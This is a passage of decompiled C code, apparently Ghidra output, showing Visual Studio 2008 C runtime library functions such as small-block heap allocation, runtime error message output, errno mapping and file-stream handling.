          puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        }
        else {
          if (cVar6 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar13 - 0x20 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          uVar13 = uVar13 - 0x20;
        }
        *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar13 & 0x1f);
      }
      piVar4 = (int *)(param_2 + -4 + uVar12);
      *piVar4 = iVar9;
      *(int *)(iVar9 + -4 + (int)piVar4) = iVar9;
    }
    *(uint *)(param_2 + -4) = uVar12 + 1;
    *(uint *)(param_2 + -8 + uVar12) = uVar12 + 1;
  }
  else if ((int)uVar12 < iVar9) {
    param_3 = iVar9 - uVar12;
    *(uint *)(param_2 + -4) = uVar12 + 1;
    piVar4 = (int *)(param_2 + -4 + uVar12);
    uVar11 = (param_3 >> 4) - 1;
    piVar4[-1] = uVar12 + 1;
    if (0x3f < uVar11) {
      uVar11 = 0x3f;
    }
    if ((uVar13 & 1) == 0) {
      uVar12 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar12) {
        uVar12 = 0x3f;
      }
      if (puVar8[1] == puVar8[2]) {
        if (uVar12 < 0x20) {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            *param_1 = *param_1 & uVar12;
          }
        }
        else {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 - 0x20 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            param_1[1] = param_1[1] & uVar12;
          }
        }
      }
      *(uint *)(puVar8[2] + 4) = puVar8[1];
      *(uint *)(puVar8[1] + 8) = puVar8[2];
      param_3 = param_3 + uVar13;
      uVar11 = (param_3 >> 4) - 1;
      if (0x3f < uVar11) {
        uVar11 = 0x3f;
      }
    }
    iVar5 = iVar5 + uVar11 * 8;
    iVar9 = *(int *)(iVar5 + 4);
    piVar4[2] = iVar5;
    piVar4[1] = iVar9;
    *(int **)(iVar5 + 4) = piVar4;
    *(int **)(piVar4[1] + 8) = piVar4;
    if (piVar4[1] == piVar4[2]) {
      cVar6 = *(char *)(uVar11 + 4 + uVar7);
      *(char *)(uVar11 + 4 + uVar7) = cVar6 + '\x01';
      if (uVar11 < 0x20) {
        if (cVar6 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> ((byte)uVar11 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
      }
      else {
        if (cVar6 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar11 - 0x20 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        uVar11 = uVar11 - 0x20;
      }
      *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar11 & 0x1f);
    }
    *piVar4 = param_3;
    *(int *)(param_3 + -4 + (int)piVar4) = param_3;
  }
  return 1;
}



// Library Function - Single Match
//  ___sbh_alloc_block
// 
// Library: Visual Studio 2008 Release

int * __cdecl ___sbh_alloc_block(uint *param_1)

{
  int *piVar1;
  char *pcVar2;
  int *piVar3;
  char cVar4;
  int *piVar5;
  byte bVar6;
  uint uVar7;
  int iVar8;
  uint *puVar9;
  int iVar10;
  uint uVar11;
  int *piVar12;
  uint *puVar13;
  uint *puVar14;
  uint uVar15;
  int iVar16;
  uint local_c;
  int local_8;
  
  puVar9 = DAT_0046ec4c + DAT_0046ec48 * 5;
  uVar7 = (int)param_1 + 0x17U & 0xfffffff0;
  iVar8 = ((int)((int)param_1 + 0x17U) >> 4) + -1;
  bVar6 = (byte)iVar8;
  param_1 = DAT_0046ec54;
  if (iVar8 < 0x20) {
    uVar15 = 0xffffffff >> (bVar6 & 0x1f);
    local_c = 0xffffffff;
  }
  else {
    uVar15 = 0;
    local_c = 0xffffffff >> (bVar6 - 0x20 & 0x1f);
  }
  for (; (param_1 < puVar9 && ((param_1[1] & local_c | *param_1 & uVar15) == 0));
      param_1 = param_1 + 5) {
  }
  puVar13 = DAT_0046ec4c;
  if (param_1 == puVar9) {
    for (; (puVar13 < DAT_0046ec54 && ((puVar13[1] & local_c | *puVar13 & uVar15) == 0));
        puVar13 = puVar13 + 5) {
    }
    param_1 = puVar13;
    if (puVar13 == DAT_0046ec54) {
      for (; (puVar13 < puVar9 && (puVar13[2] == 0)); puVar13 = puVar13 + 5) {
      }
      puVar14 = DAT_0046ec4c;
      param_1 = puVar13;
      if (puVar13 == puVar9) {
        for (; (puVar14 < DAT_0046ec54 && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {
        }
        param_1 = puVar14;
        if ((puVar14 == DAT_0046ec54) &&
           (param_1 = ___sbh_alloc_new_region(), param_1 == (uint *)0x0)) {
          return (int *)0x0;
        }
      }
      iVar8 = ___sbh_alloc_new_group((int)param_1);
      *(int *)param_1[4] = iVar8;
      if (*(int *)param_1[4] == -1) {
        return (int *)0x0;
      }
    }
  }
  piVar5 = (int *)param_1[4];
  local_8 = *piVar5;
  if ((local_8 == -1) || ((piVar5[local_8 + 0x31] & local_c | piVar5[local_8 + 0x11] & uVar15) == 0)
     ) {
    local_8 = 0;
    puVar9 = (uint *)(piVar5 + 0x11);
    uVar11 = piVar5[0x31];
    while ((uVar11 & local_c | *puVar9 & uVar15) == 0) {
      local_8 = local_8 + 1;
      puVar13 = puVar9 + 0x21;
      puVar9 = puVar9 + 1;
      uVar11 = *puVar13;
    }
  }
  piVar3 = piVar5 + local_8 * 0x81 + 0x51;
  iVar8 = 0;
  uVar15 = piVar5[local_8 + 0x11] & uVar15;
  if (uVar15 == 0) {
    uVar15 = piVar5[local_8 + 0x31] & local_c;
    iVar8 = 0x20;
  }
  for (; -1 < (int)uVar15; uVar15 = uVar15 * 2) {
    iVar8 = iVar8 + 1;
  }
  piVar12 = (int *)piVar3[iVar8 * 2 + 1];
  iVar10 = *piVar12 - uVar7;
  iVar16 = (iVar10 >> 4) + -1;
  if (0x3f < iVar16) {
    iVar16 = 0x3f;
  }
  DAT_0046ec54 = param_1;
  if (iVar16 != iVar8) {
    if (piVar12[1] == piVar12[2]) {
      if (iVar8 < 0x20) {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 & 0x1f));
        piVar5[local_8 + 0x11] = uVar15 & piVar5[local_8 + 0x11];
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          *param_1 = *param_1 & uVar15;
        }
      }
      else {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 - 0x20 & 0x1f));
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] & uVar15;
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          param_1[1] = param_1[1] & uVar15;
        }
      }
    }
    *(int *)(piVar12[2] + 4) = piVar12[1];
    *(int *)(piVar12[1] + 8) = piVar12[2];
    if (iVar10 == 0) goto LAB_0041384d;
    piVar1 = piVar3 + iVar16 * 2;
    iVar8 = piVar1[1];
    piVar12[2] = (int)piVar1;
    piVar12[1] = iVar8;
    piVar1[1] = (int)piVar12;
    *(int **)(piVar12[1] + 8) = piVar12;
    if (piVar12[1] == piVar12[2]) {
      cVar4 = *(char *)(iVar16 + 4 + (int)piVar5);
      *(char *)(iVar16 + 4 + (int)piVar5) = cVar4 + '\x01';
      bVar6 = (byte)iVar16;
      if (iVar16 < 0x20) {
        if (cVar4 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar6 & 0x1f);
        }
        piVar5[local_8 + 0x11] = piVar5[local_8 + 0x11] | 0x80000000U >> (bVar6 & 0x1f);
      }
      else {
        if (cVar4 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
        }
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
      }
    }
  }
  if (iVar10 != 0) {
    *piVar12 = iVar10;
    *(int *)(iVar10 + -4 + (int)piVar12) = iVar10;
  }
LAB_0041384d:
  piVar12 = (int *)((int)piVar12 + iVar10);
  *piVar12 = uVar7 + 1;
  *(uint *)((int)piVar12 + (uVar7 - 4)) = uVar7 + 1;
  iVar8 = *piVar3;
  *piVar3 = iVar8 + 1;
  if (((iVar8 == 0) && (param_1 == DAT_0042d558)) && (local_8 == DAT_0046ec5c)) {
    DAT_0042d558 = (uint *)0x0;
  }
  *piVar5 = local_8;
  return piVar12 + 1;
}



// Library Function - Single Match
//  __heap_init
// 
// Library: Visual Studio 2008 Release

int __cdecl __heap_init(void)

{
  int in_stack_00000004;
  
  DAT_0042d55c = HeapCreate((uint)(in_stack_00000004 == 0),0x1000,0);
  if (DAT_0042d55c == (HANDLE)0x0) {
    return 0;
  }
  DAT_0046ec44 = 1;
  return 1;
}



// Library Function - Single Match
//  __NMSG_WRITE
// 
// Library: Visual Studio 2008 Release

void __cdecl __NMSG_WRITE(int param_1)

{
  char **ppcVar1;
  uint uVar2;
  int iVar3;
  errno_t eVar4;
  DWORD DVar5;
  size_t sVar6;
  HANDLE hFile;
  DWORD *lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  DWORD local_c;
  uint local_8;
  
  local_8 = 0;
  do {
    if (param_1 == (&DAT_0042b468)[local_8 * 2]) break;
    local_8 = local_8 + 1;
  } while (local_8 < 0x17);
  uVar2 = local_8;
  if (local_8 < 0x17) {
    iVar3 = __set_error_mode(3);
    if ((iVar3 != 1) && ((iVar3 = __set_error_mode(3), iVar3 != 0 || (DAT_0042b090 != 1)))) {
      if (param_1 == 0xfc) {
        return;
      }
      eVar4 = _strcpy_s(&DAT_0042d560,0x314,"Runtime Error!\n\nProgram: ");
      if (eVar4 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      DAT_0042d67d = 0;
      DVar5 = GetModuleFileNameA((HMODULE)0x0,&DAT_0042d579,0x104);
      if ((DVar5 == 0) &&
         (eVar4 = _strcpy_s(&DAT_0042d579,0x2fb,"<program name unknown>"), eVar4 != 0)) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      sVar6 = _strlen(&DAT_0042d579);
      if (0x3c < sVar6 + 1) {
        sVar6 = _strlen(&DAT_0042d579);
        eVar4 = _strncpy_s((char *)(sVar6 + 0x42d53e),
                           (int)&DAT_0042d874 - (int)(char *)(sVar6 + 0x42d53e),"...",3);
        if (eVar4 != 0) {
                    // WARNING: Subroutine does not return
          __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        }
      }
      eVar4 = _strcat_s(&DAT_0042d560,0x314,"\n\n");
      if (eVar4 == 0) {
        eVar4 = _strcat_s(&DAT_0042d560,0x314,*(char **)(local_8 * 8 + 0x42b46c));
        if (eVar4 == 0) {
          ___crtMessageBoxA(&DAT_0042d560,"Microsoft Visual C++ Runtime Library",0x12010);
          return;
        }
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    hFile = GetStdHandle(0xfffffff4);
    if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffff)) {
      lpOverlapped = (LPOVERLAPPED)0x0;
      lpNumberOfBytesWritten = &local_c;
      ppcVar1 = (char **)(uVar2 * 8 + 0x42b46c);
      sVar6 = _strlen(*ppcVar1);
      WriteFile(hFile,*ppcVar1,sVar6,lpNumberOfBytesWritten,lpOverlapped);
    }
  }
  return;
}



// Library Function - Single Match
//  __FF_MSGBANNER
// 
// Library: Visual Studio 2008 Release

void __cdecl __FF_MSGBANNER(void)

{
  int iVar1;
  
  iVar1 = __set_error_mode(3);
  if (iVar1 != 1) {
    iVar1 = __set_error_mode(3);
    if (iVar1 != 0) {
      return;
    }
    if (DAT_0042b090 != 1) {
      return;
    }
  }
  __NMSG_WRITE(0xfc);
  __NMSG_WRITE(0xff);
  return;
}



// Library Function - Single Match
//  __get_errno_from_oserr
// 
// Library: Visual Studio 2008 Release

int __cdecl __get_errno_from_oserr(ulong param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_0042b520)[uVar1 * 2]) {
      return (&DAT_0042b524)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbc) & 0xe) + 8;
}



// Library Function - Single Match
//  __errno
// 
// Library: Visual Studio 2008 Release

int * __cdecl __errno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (int *)&DAT_0042b688;
  }
  return &p_Var1->_terrno;
}



// Library Function - Single Match
//  ___doserrno
// 
// Library: Visual Studio 2008 Release

ulong * __cdecl ___doserrno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (ulong *)&DAT_0042b68c;
  }
  return &p_Var1->_tdoserrno;
}



// Library Function - Single Match
//  __dosmaperr
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __dosmaperr(ulong param_1)

{
  ulong *puVar1;
  int iVar2;
  int *piVar3;
  
  puVar1 = ___doserrno();
  *puVar1 = param_1;
  iVar2 = __get_errno_from_oserr(param_1);
  piVar3 = __errno();
  *piVar3 = iVar2;
  return;
}



void __cdecl FUN_00413b2f(undefined4 param_1)

{
  DAT_0042d874 = param_1;
  return;
}



// Library Function - Single Match
//  __callnewh
// 
// Library: Visual Studio 2008 Release

int __cdecl __callnewh(size_t _Size)

{
  code *pcVar1;
  int iVar2;
  
  pcVar1 = (code *)__decode_pointer(DAT_0042d874);
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*pcVar1)(_Size);
    if (iVar2 != 0) {
      return 1;
    }
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wopenfile
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __wopenfile(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag,FILE *_File)

{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  wchar_t wVar5;
  int *piVar6;
  int iVar7;
  errno_t eVar8;
  uint _OpenFlag;
  wchar_t *pwVar9;
  wchar_t *pwVar10;
  uint local_8;
  
  bVar3 = false;
  bVar2 = false;
  bVar4 = false;
  for (pwVar10 = _Mode; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
  }
  wVar5 = *pwVar10;
  if (wVar5 == L'a') {
    _OpenFlag = 0x109;
LAB_00413bd6:
    local_8 = DAT_0042db34 | 2;
  }
  else {
    if (wVar5 != L'r') {
      if (wVar5 != L'w') goto LAB_00413ba3;
      _OpenFlag = 0x301;
      goto LAB_00413bd6;
    }
    _OpenFlag = 0;
    local_8 = DAT_0042db34 | 1;
  }
  bVar1 = true;
  pwVar10 = pwVar10 + 1;
  wVar5 = *pwVar10;
  if (wVar5 != L'\0') {
    do {
      if (!bVar1) break;
      if ((ushort)wVar5 < 0x54) {
        if (wVar5 == L'S') {
          if (bVar2) goto LAB_00413d04;
          bVar2 = true;
          _OpenFlag = _OpenFlag | 0x20;
        }
        else if (wVar5 != L' ') {
          if (wVar5 == L'+') {
            if ((_OpenFlag & 2) != 0) goto LAB_00413d04;
            _OpenFlag = _OpenFlag & 0xfffffffe | 2;
            local_8 = local_8 & 0xfffffffc | 0x80;
          }
          else if (wVar5 == L',') {
            bVar4 = true;
LAB_00413d04:
            bVar1 = false;
          }
          else if (wVar5 == L'D') {
            if ((_OpenFlag & 0x40) != 0) goto LAB_00413d04;
            _OpenFlag = _OpenFlag | 0x40;
          }
          else if (wVar5 == L'N') {
            _OpenFlag = _OpenFlag | 0x80;
          }
          else {
            if (wVar5 != L'R') goto LAB_00413ba3;
            if (bVar2) goto LAB_00413d04;
            bVar2 = true;
            _OpenFlag = _OpenFlag | 0x10;
          }
        }
      }
      else if (wVar5 == L'T') {
        if ((_OpenFlag & 0x1000) != 0) goto LAB_00413d04;
        _OpenFlag = _OpenFlag | 0x1000;
      }
      else if (wVar5 == L'b') {
        if ((_OpenFlag & 0xc000) != 0) goto LAB_00413d04;
        _OpenFlag = _OpenFlag | 0x8000;
      }
      else if (wVar5 == L'c') {
        if (bVar3) goto LAB_00413d04;
        local_8 = local_8 | 0x4000;
        bVar3 = true;
      }
      else if (wVar5 == L'n') {
        if (bVar3) goto LAB_00413d04;
        local_8 = local_8 & 0xffffbfff;
        bVar3 = true;
      }
      else {
        if (wVar5 != L't') goto LAB_00413ba3;
        if ((_OpenFlag & 0xc000) != 0) goto LAB_00413d04;
        _OpenFlag = _OpenFlag | 0x4000;
      }
      pwVar10 = pwVar10 + 1;
      wVar5 = *pwVar10;
    } while (wVar5 != L'\0');
    if (bVar4) {
      for (; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
      }
      iVar7 = _wcsncmp(L"ccs",pwVar10,3);
      if (iVar7 != 0) goto LAB_00413ba3;
      for (pwVar10 = pwVar10 + 3; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
      }
      if (*pwVar10 != L'=') goto LAB_00413ba3;
      do {
        pwVar9 = pwVar10;
        pwVar10 = pwVar9 + 1;
      } while (*pwVar10 == L' ');
      iVar7 = __wcsnicmp(pwVar10,L"UTF-8",5);
      if (iVar7 == 0) {
        pwVar10 = pwVar9 + 6;
        _OpenFlag = _OpenFlag | 0x40000;
      }
      else {
        iVar7 = __wcsnicmp(pwVar10,L"UTF-16LE",8);
        if (iVar7 == 0) {
          pwVar10 = pwVar9 + 9;
          _OpenFlag = _OpenFlag | 0x20000;
        }
        else {
          iVar7 = __wcsnicmp(pwVar10,L"UNICODE",7);
          if (iVar7 != 0) goto LAB_00413ba3;
          pwVar10 = pwVar9 + 8;
          _OpenFlag = _OpenFlag | 0x10000;
        }
      }
    }
  }
  for (; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
  }
  if (*pwVar10 == L'\0') {
    eVar8 = __wsopen_s((int *)&_Mode,_Filename,_OpenFlag,_ShFlag,0x180);
    if (eVar8 != 0) {
      return (FILE *)0x0;
    }
    _DAT_0042d0d8 = _DAT_0042d0d8 + 1;
    _File->_flag = local_8;
    _File->_cnt = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_tmpfname = (char *)0x0;
    _File->_file = (int)_Mode;
    return _File;
  }
LAB_00413ba3:
  piVar6 = __errno();
  *piVar6 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return (FILE *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __getstream
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __getstream(void)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  void *pvVar4;
  BOOL BVar5;
  int iVar6;
  FILE *pFVar7;
  FILE *_File;
  
  pFVar7 = (FILE *)0x0;
  __lock(1);
  iVar6 = 0;
  do {
    _File = pFVar7;
    if (DAT_0046fc80 <= iVar6) {
LAB_00413f18:
      if (_File != (FILE *)0x0) {
        _File->_flag = _File->_flag & 0x8000;
        _File->_cnt = 0;
        _File->_base = (char *)0x0;
        _File->_ptr = (char *)0x0;
        _File->_tmpfname = (char *)0x0;
        _File->_file = -1;
      }
      FUN_00413f49();
      return _File;
    }
    piVar1 = (int *)(DAT_0046ec60 + iVar6 * 4);
    if (*piVar1 == 0) {
      iVar6 = iVar6 * 4;
      pvVar4 = __malloc_crt(0x38);
      *(void **)(iVar6 + DAT_0046ec60) = pvVar4;
      if (*(int *)(DAT_0046ec60 + iVar6) != 0) {
        BVar5 = ___crtInitCritSecAndSpinCount
                          ((LPCRITICAL_SECTION)(*(int *)(DAT_0046ec60 + iVar6) + 0x20),4000);
        if (BVar5 == 0) {
          _free(*(void **)(iVar6 + DAT_0046ec60));
          *(undefined4 *)(iVar6 + DAT_0046ec60) = 0;
        }
        else {
          EnterCriticalSection((LPCRITICAL_SECTION)(*(int *)(iVar6 + DAT_0046ec60) + 0x20));
          _File = *(FILE **)(iVar6 + DAT_0046ec60);
          _File->_flag = 0;
        }
      }
      goto LAB_00413f18;
    }
    uVar2 = *(uint *)(*piVar1 + 0xc);
    if (((uVar2 & 0x83) == 0) && ((uVar2 & 0x8000) == 0)) {
      if ((iVar6 - 3U < 0x11) && (iVar3 = __mtinitlocknum(iVar6 + 0x10), iVar3 == 0))
      goto LAB_00413f18;
      __lock_file2(iVar6,*(void **)(DAT_0046ec60 + iVar6 * 4));
      _File = *(FILE **)(DAT_0046ec60 + iVar6 * 4);
      if ((*(byte *)&_File->_flag & 0x83) == 0) goto LAB_00413f18;
      __unlock_file2(iVar6,_File);
    }
    iVar6 = iVar6 + 1;
  } while( true );
}



void FUN_00413f49(void)

{
  FUN_00412cbf(1);
  return;
}



void __cdecl FUN_00413f52(undefined4 param_1)

{
  DAT_0042d87c = param_1;
  return;
}



// Library Function - Single Match
//  __invoke_watson
// 
// Library: Visual Studio 2008 Release

void __cdecl
__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  uint uVar1;
  BOOL BVar2;
  LONG LVar3;
  HANDLE hProcess;
  UINT uExitCode;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  uVar1 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  local_32c.ExceptionCode = 0;
  _memset(&local_32c.ExceptionFlags,0,0x4c);
  local_2dc.ExceptionRecord = &local_32c;
  local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
  local_2d4 = 0x10001;
  local_32c.ExceptionCode = 0xc0000417;
  local_32c.ExceptionFlags = 1;
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter(&local_2dc);
  if ((LVar3 == 0) && (BVar2 == 0)) {
    FUN_0041baa6();
  }
  uExitCode = 0xc0000417;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __invalid_parameter
// 
// Library: Visual Studio 2008 Release

void __cdecl
__invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,
                   uintptr_t param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)__decode_pointer(DAT_0042d87c);
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x0041409f. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
  FUN_0041baa6();
                    // WARNING: Subroutine does not return
  __invoke_watson(param_1,param_2,param_3,param_4,param_5);
}



// Library Function - Single Match
//  __local_unwind4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __cdecl __local_unwind4(uint *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  void *pvStack_28;
  undefined *puStack_24;
  uint local_20;
  uint uStack_1c;
  int iStack_18;
  uint *puStack_14;
  
  puStack_14 = param_1;
  iStack_18 = param_2;
  uStack_1c = param_3;
  puStack_24 = &LAB_00414140;
  pvStack_28 = ExceptionList;
  local_20 = DAT_0042b0a0 ^ (uint)&pvStack_28;
  ExceptionList = &pvStack_28;
  while( true ) {
    uVar2 = *(uint *)(param_2 + 0xc);
    if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;
    puVar1 = (undefined4 *)((*(uint *)(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc);
    *(undefined4 *)(param_2 + 0xc) = *puVar1;
    if (puVar1[1] == 0) {
      __NLG_Notify(0x101);
      FUN_0041c894();
    }
  }
  ExceptionList = pvStack_28;
  return;
}



void FUN_00414186(int param_1)

{
  __local_unwind4(*(uint **)(param_1 + 0x28),*(int *)(param_1 + 0x18),*(uint *)(param_1 + 0x1c));
  return;
}



// Library Function - Single Match
//  @_EH4_CallFilterFunc@8
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_CallFilterFunc_8(undefined *param_1)

{
  (*(code *)param_1)();
  return;
}



// Library Function - Single Match
//  @_EH4_TransferToHandler@8
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_TransferToHandler_8(undefined *UNRECOVERED_JUMPTABLE)

{
  __NLG_Notify(1);
                    // WARNING: Could not recover jumptable at 0x004141d0. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  @_EH4_GlobalUnwind@4
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_GlobalUnwind_4(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x4141e7,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  @_EH4_LocalUnwind@16
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_LocalUnwind_16(int param_1,uint param_2,undefined4 param_3,uint *param_4)

{
  __local_unwind4(param_4,param_1,param_2);
  return;
}



// Library Function - Single Match
//  __flsbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __flsbuf(int _Ch,FILE *_File)

{
  char *_Buf;
  char *pcVar1;
  FILE *_File_00;
  int *piVar2;
  undefined **ppuVar3;
  int iVar4;
  undefined *puVar5;
  int unaff_EDI;
  uint uVar6;
  longlong lVar7;
  uint local_8;
  
  _File_00 = _File;
  _File = (FILE *)__fileno(_File);
  uVar6 = _File_00->_flag;
  if ((uVar6 & 0x82) == 0) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_00414229:
    _File_00->_flag = _File_00->_flag | 0x20;
    return -1;
  }
  if ((uVar6 & 0x40) != 0) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    goto LAB_00414229;
  }
  if ((uVar6 & 1) != 0) {
    _File_00->_cnt = 0;
    if ((uVar6 & 0x10) == 0) {
      _File_00->_flag = uVar6 | 0x20;
      return -1;
    }
    _File_00->_ptr = _File_00->_base;
    _File_00->_flag = uVar6 & 0xfffffffe;
  }
  uVar6 = _File_00->_flag;
  _File_00->_flag = uVar6 & 0xffffffef | 2;
  _File_00->_cnt = 0;
  local_8 = 0;
  if (((uVar6 & 0x10c) == 0) &&
     (((ppuVar3 = FUN_00412435(), _File_00 != (FILE *)(ppuVar3 + 8) &&
       (ppuVar3 = FUN_00412435(), _File_00 != (FILE *)(ppuVar3 + 0x10))) ||
      (iVar4 = __isatty((int)_File), iVar4 == 0)))) {
    __getbuf(_File_00);
  }
  if ((_File_00->_flag & 0x108U) == 0) {
    uVar6 = 1;
    local_8 = __write((int)_File,&_Ch,1);
  }
  else {
    _Buf = _File_00->_base;
    pcVar1 = _File_00->_ptr;
    _File_00->_ptr = _Buf + 1;
    uVar6 = (int)pcVar1 - (int)_Buf;
    _File_00->_cnt = _File_00->_bufsiz + -1;
    if ((int)uVar6 < 1) {
      if ((_File == (FILE *)0xffffffff) || (_File == (FILE *)0xfffffffe)) {
        puVar5 = &DAT_0042b798;
      }
      else {
        puVar5 = (undefined *)(((uint)_File & 0x1f) * 0x40 + (&DAT_0046eb40)[(int)_File >> 5]);
      }
      if (((puVar5[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64((int)_File,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_00414351;
    }
    else {
      local_8 = __write((int)_File,_Buf,uVar6);
    }
    *_File_00->_base = (char)_Ch;
  }
  if (local_8 == uVar6) {
    return _Ch & 0xff;
  }
LAB_00414351:
  _File_00->_flag = _File_00->_flag | 0x20;
  return -1;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __write_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __write_nolock(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  WCHAR WVar1;
  wint_t wVar2;
  ulong *puVar3;
  int *piVar4;
  int iVar5;
  _ptiddata p_Var6;
  BOOL BVar7;
  DWORD nNumberOfBytesToWrite;
  int iVar8;
  uint uVar9;
  char cVar10;
  WCHAR *pWVar11;
  char *pcVar12;
  int unaff_EDI;
  WCHAR *pWVar13;
  ushort uVar14;
  UINT local_1ae8;
  uint local_1ae4;
  char local_1add;
  int *local_1adc;
  char *local_1ad8;
  int local_1ad4;
  WCHAR *local_1ad0;
  char *local_1acc;
  WCHAR *local_1ac8;
  DWORD local_1ac4;
  WCHAR *local_1ac0;
  WCHAR local_1abc [852];
  CHAR local_1414 [3416];
